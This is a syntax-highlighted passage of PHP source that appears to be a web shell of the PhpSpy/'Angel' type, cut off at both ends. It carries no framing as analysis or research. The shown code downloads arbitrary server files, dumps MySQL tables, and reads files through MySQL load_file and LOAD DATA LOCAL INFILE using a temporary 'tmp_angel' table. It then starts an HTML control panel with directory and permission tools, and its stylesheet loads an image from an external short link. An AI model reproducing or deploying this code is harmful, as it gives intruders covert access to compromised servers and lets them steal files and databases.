<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!@<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">thefile</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">errmsg</span> = <span style="color: #ad7fa8; font-style: italic;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fileinfo</span> = <span style="color: #eeeeec; background-color: #2e3436;">pathinfo(</span>$<span style="color: #eeeeec;">thefile</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-type: application/x-'</span>.$<span style="color: #eeeeec;">fileinfo</span>[<span style="color: #ad7fa8; font-style: italic;">'extension'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #eeeeec;">fileinfo</span>[<span style="color: #ad7fa8; font-style: italic;">'basename'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-Length: '</span>.<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">thefile</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">readfile(</span>$<span style="color: #eeeeec;">thefile</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'backupmysql'</span> &amp;&amp; !$<span style="color: #eeeeec;">saveasfile</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">table</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">errmsg</span> =<span style="color: #ad7fa8; font-style: italic;">'Please choose the table'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>, $<span style="color: #eeeeec;">dbuser</span>, $<span style="color: #eeeeec;">dbpass</span>, $<span style="color: #eeeeec;">dbname</span>, $<span style="color: #eeeeec;">charset</span>, $<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filename</span> = <span style="color: #eeeeec; background-color: #2e3436;">basename(</span>$<span style="color: #eeeeec;">dbname</span>.<span style="color: #ad7fa8; font-style: italic;">'.sql'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-type: application/unknown'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #eeeeec;">filename</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">table</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">k</span> =&gt; $<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">sqldumptable(</span>$<span style="color: #eeeeec;">v</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">mysql_close(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">doing</span>==<span style="color: #ad7fa8; font-style: italic;">'mysqldown'</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">dbname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">errmsg</span> = <span style="color: #ad7fa8; font-style: italic;">'Please input dbname'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>, $<span style="color: #eeeeec;">dbuser</span>, $<span style="color: #eeeeec;">dbpass</span>, $<span style="color: #eeeeec;">dbname</span>, $<span style="color: #eeeeec;">charset</span>, $<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">mysqldlfile</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">errmsg</span> = <span style="color: #ad7fa8; font-style: italic;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"select load_file('$mysqldlfile');"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!$<span style="color: #eeeeec;">result</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"LOAD DATA LOCAL INFILE '"</span>.<span style="color: #eeeeec; background-color: #2e3436;">addslashes(</span>$<span style="color: #eeeeec;">mysqldlfile</span>).<span style="color: #ad7fa8; font-style: italic;">"' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"select content from tmp_angel"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"DROP TABLE tmp_angel"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">row</span> = @<span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">result</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">row</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">errmsg</span> = <span style="color: #ad7fa8; font-style: italic;">'Load file failed '</span>.<span style="color: #eeeeec; background-color: #2e3436;">mysql_error(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fileinfo</span> = <span style="color: #eeeeec; background-color: #2e3436;">pathinfo(</span>$<span style="color: #eeeeec;">mysqldlfile</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-type: application/x-'</span>.$<span style="color: #eeeeec;">fileinfo</span>[<span style="color: #ad7fa8; font-style: italic;">'extension'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #eeeeec;">fileinfo</span>[<span style="color: #ad7fa8; font-style: italic;">'basename'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"Accept-Length: "</span>.<span style="color: #eeeeec; background-color: #2e3436;">strlen(</span>$<span style="color: #eeeeec;">row</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>]));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">row</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf;">?&gt;</span>
<span style="color: #8ae234;">&lt;html&gt;</span>
<span style="color: #8ae234;">&lt;head&gt;</span>
<span style="color: #8ae234;">&lt;meta</span> <span style="color: #f57900; font-weight: bold;">http</span>-<span style="color: #f57900; font-weight: bold;">equiv</span>=<span style="color: #ad7fa8; font-style: italic;">"Content-Type"</span> <span style="color: #8ae234;">content=</span><span style="color: #ad7fa8; font-style: italic;">"text/html; charset=gbk"</span><span style="color: #8ae234;">&gt;</span>
<span style="color: #8ae234;">&lt;title&gt;</span><span style="color: #729fcf;">&lt;?php</span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">action</span>.<span style="color: #ad7fa8; font-style: italic;">' - '</span>.$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_HOST'</span>];<span style="color: #729fcf;">?&gt;</span><span style="color: #8ae234;">&lt;/title&gt;</span>
<span style="color: #8ae234;">&lt;style</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"text/css"</span><span style="color: #8ae234;">&gt;</span>
<span style="color: #f57900; font-weight: bold;">body</span>,<span style="color: #f57900; font-weight: bold;">td</span>{<span style="color: #f57900; font-weight: bold;">font</span>: <span style="color: #eeeeec; background-color: #2e3436;">12</span>px <span style="color: #f57900; font-weight: bold;">Arial</span>,<span style="color: #f57900; font-weight: bold;">Tahoma</span>;<span style="color: #f57900; font-weight: bold;">line</span>-<span style="color: #f57900; font-weight: bold;">height</span>: <span style="color: #eeeeec; background-color: #2e3436;">16</span>px;}
.<span style="color: #f57900; font-weight: bold;">input</span>{<span style="color: #f57900; font-weight: bold;">font</span>:<span style="color: #eeeeec; background-color: #2e3436;">12</span>px <span style="color: #f57900; font-weight: bold;">Arial</span>,<span style="color: #f57900; font-weight: bold;">Tahoma</span>;<span style="color: #f57900; font-weight: bold;">background</span>:<span style="color: #888a85;">#fff;border: 1px solid #666;padding:2px;height:22px;}</span>
.<span style="color: #f57900; font-weight: bold;">area</span>{<span style="color: #f57900; font-weight: bold;">font</span>:<span style="color: #eeeeec; background-color: #2e3436;">12</span>px <span style="color: #ad7fa8; font-style: italic;">'Courier New'</span>, <span style="color: #f57900; font-weight: bold;">Monospace</span>;<span style="color: #f57900; font-weight: bold;">background</span>:<span style="color: #888a85;">#fff;border: 1px solid #666;padding:2px;}</span>
.<span style="color: #f57900; font-weight: bold;">bt</span> {<span style="color: #f57900; font-weight: bold;">border</span>-<span style="color: #f57900; font-weight: bold;">color</span>:<span style="color: #888a85;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#ffffff;font:12px Arial,Tahoma;height:22px;}</span>
<span style="color: #f57900; font-weight: bold;">a</span> {<span style="color: #f57900; font-weight: bold;">color</span>: <span style="color: #888a85;">#00f;text-decoration:underline;}</span>
<span style="color: #f57900; font-weight: bold;">a</span>:<span style="color: #f57900; font-weight: bold;">hover</span>{<span style="color: #f57900; font-weight: bold;">color</span>: <span style="color: #888a85;">#f00;text-decoration:none;}</span>
.<span style="color: #f57900; font-weight: bold;">alt1</span> <span style="color: #f57900; font-weight: bold;">td</span>{<span style="color: #f57900; font-weight: bold;">border</span>-<span style="color: #f57900; font-weight: bold;">top</span>:<span style="color: #eeeeec; background-color: #2e3436;">1</span>px <span style="color: #f57900; font-weight: bold;">solid</span> <span style="color: #888a85;">#fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}</span>
.<span style="color: #f57900; font-weight: bold;">alt2</span> <span style="color: #f57900; font-weight: bold;">td</span>{<span style="color: #f57900; font-weight: bold;">border</span>-<span style="color: #f57900; font-weight: bold;">top</span>:<span style="color: #eeeeec; background-color: #2e3436;">1</span>px <span style="color: #f57900; font-weight: bold;">solid</span> <span style="color: #888a85;">#fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}</span>
.<span style="color: #f57900; font-weight: bold;">focus</span> <span style="color: #f57900; font-weight: bold;">td</span>{<span style="color: #f57900; font-weight: bold;">border</span>-<span style="color: #f57900; font-weight: bold;">top</span>:<span style="color: #eeeeec; background-color: #2e3436;">1</span>px <span style="color: #f57900; font-weight: bold;">solid</span> <span style="color: #888a85;">#fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}</span>
.<span style="color: #f57900; font-weight: bold;">head</span> <span style="color: #f57900; font-weight: bold;">td</span>{<span style="color: #f57900; font-weight: bold;">border</span>-<span style="color: #f57900; font-weight: bold;">top</span>:<span style="color: #eeeeec; background-color: #2e3436;">1</span>px <span style="color: #f57900; font-weight: bold;">solid</span> <span style="color: #888a85;">#fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.<span style="color: #f57900; font-weight: bold;">head</span> <span style="color: #f57900; font-weight: bold;">td</span> <span style="color: #f57900; font-weight: bold;">span</span>{<span style="color: #f57900; font-weight: bold;">font</span>-<span style="color: #f57900; font-weight: bold;">weight</span>:<span style="color: #f57900; font-weight: bold;">normal</span>;}
.<span style="color: #f57900; font-weight: bold;">infolist</span> {<span style="color: #f57900; font-weight: bold;">padding</span>:<span style="color: #eeeeec; background-color: #2e3436;">10</span>px;<span style="color: #f57900; font-weight: bold;">margin</span>:<span style="color: #eeeeec; background-color: #2e3436;">10</span>px <span style="color: #eeeeec; background-color: #2e3436;">0</span> <span style="color: #eeeeec; background-color: #2e3436;">20</span>px <span style="color: #eeeeec; background-color: #2e3436;">0</span>;<span style="color: #f57900; font-weight: bold;">background</span>:<span style="color: #888a85;">#F1F1F1;border:1px solid #ddd;}</span>
<span style="color: #f57900; font-weight: bold;">form</span>{<span style="color: #f57900; font-weight: bold;">margin</span>:<span style="color: #eeeeec; background-color: #2e3436;">0</span>;<span style="color: #f57900; font-weight: bold;">padding</span>:<span style="color: #eeeeec; background-color: #2e3436;">0</span>;}
<span style="color: #f57900; font-weight: bold;">h2</span>{<span style="color: #f57900; font-weight: bold;">margin</span>:<span style="color: #eeeeec; background-color: #2e3436;">0</span>;<span style="color: #f57900; font-weight: bold;">padding</span>:<span style="color: #eeeeec; background-color: #2e3436;">0</span>;<span style="color: #f57900; font-weight: bold;">height</span>:<span style="color: #eeeeec; background-color: #2e3436;">24</span>px;<span style="color: #f57900; font-weight: bold;">line</span>-<span style="color: #f57900; font-weight: bold;">height</span>:<span style="color: #eeeeec; background-color: #2e3436;">24</span>px;<span style="color: #f57900; font-weight: bold;">font</span>-<span style="color: #f57900; font-weight: bold;">size</span>:<span style="color: #eeeeec; background-color: #2e3436;">14</span>px;<span style="color: #f57900; font-weight: bold;">color</span>:<span style="color: #888a85;">#5B686F;}</span>
<span style="color: #f57900; font-weight: bold;">ul</span>.<span style="color: #f57900; font-weight: bold;">info</span> <span style="color: #f57900; font-weight: bold;">li</span>{<span style="color: #f57900; font-weight: bold;">margin</span>:<span style="color: #eeeeec; background-color: #2e3436;">0</span>;<span style="color: #f57900; font-weight: bold;">color</span>:<span style="color: #888a85;">#444;line-height:24px;height:24px;}</span>
<span style="color: #f57900; font-weight: bold;">u</span>{<span style="color: #f57900; font-weight: bold;">text</span>-<span style="color: #f57900; font-weight: bold;">decoration</span>: <span style="color: #f57900; font-weight: bold;">none</span>;<span style="color: #f57900; font-weight: bold;">color</span>:<span style="color: #888a85;">#777;float:left;display:block;width:150px;margin-right:10px;}</span>
.<span style="color: #f57900; font-weight: bold;">drives</span>{<span style="color: #f57900; font-weight: bold;">padding</span>:<span style="color: #eeeeec; background-color: #2e3436;">5</span>px;}
.<span style="color: #f57900; font-weight: bold;">drives</span> <span style="color: #f57900; font-weight: bold;">span</span> {<span style="color: #f57900; font-weight: bold;">margin</span>:<span style="color: #f57900; font-weight: bold;">auto</span> <span style="color: #eeeeec; background-color: #2e3436;">7</span>px;}
<span style="color: #8ae234;">&lt;/style&gt;</span>
<span style="color: #8ae234;">&lt;script</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"text/javascript"</span><span style="color: #8ae234;">&gt;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">CheckAll</span>(<span style="color: #f57900; font-weight: bold;">form</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">for</span>(<span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">i</span>=<span style="color: #eeeeec; background-color: #2e3436;">0</span>;<span style="color: #f57900; font-weight: bold;">i</span><span style="color: #8ae234;">&lt;form</span>.<span style="color: #f57900; font-weight: bold;">elements</span>.<span style="color: #f57900; font-weight: bold;">length</span>;<span style="color: #f57900; font-weight: bold;">i</span>++) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">e</span> = <span style="color: #f57900; font-weight: bold;">form</span>.<span style="color: #eeeeec; background-color: #2e3436;">elements[</span><span style="color: #f57900; font-weight: bold;">i</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">e</span>.<span style="color: #f57900; font-weight: bold;">name</span> != <span style="color: #ad7fa8; font-style: italic;">'chkall'</span>)
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">e</span>.<span style="color: #f57900; font-weight: bold;">checked</span> = <span style="color: #f57900; font-weight: bold;">form</span>.<span style="color: #f57900; font-weight: bold;">chkall</span>.<span style="color: #f57900; font-weight: bold;">checked</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">$</span>(<span style="color: #f57900; font-weight: bold;">id</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #f57900; font-weight: bold;">document</span>.<span style="color: #eeeeec; background-color: #2e3436;">getElementById(</span><span style="color: #f57900; font-weight: bold;">id</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">createdir</span>(){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">var</span> <span style="color: #f57900; font-weight: bold;">newdirname</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #f57900; font-weight: bold;">newdirname</span> = <span style="color: #eeeeec; background-color: #2e3436;">prompt(</span><span style="color: #ad7fa8; font-style: italic;">'Please input the directory name:'</span>, <span style="color: #ad7fa8; font-style: italic;">''</span><span style="background-color: #404040;"> </span> );
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #f57900; font-weight: bold;">newdirname</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'createdir'</span>).<span style="color: #f57900; font-weight: bold;">newdirname</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">newdirname</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'createdir'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">fileperm</span>(<span style="color: #f57900; font-weight: bold;">pfile</span>){
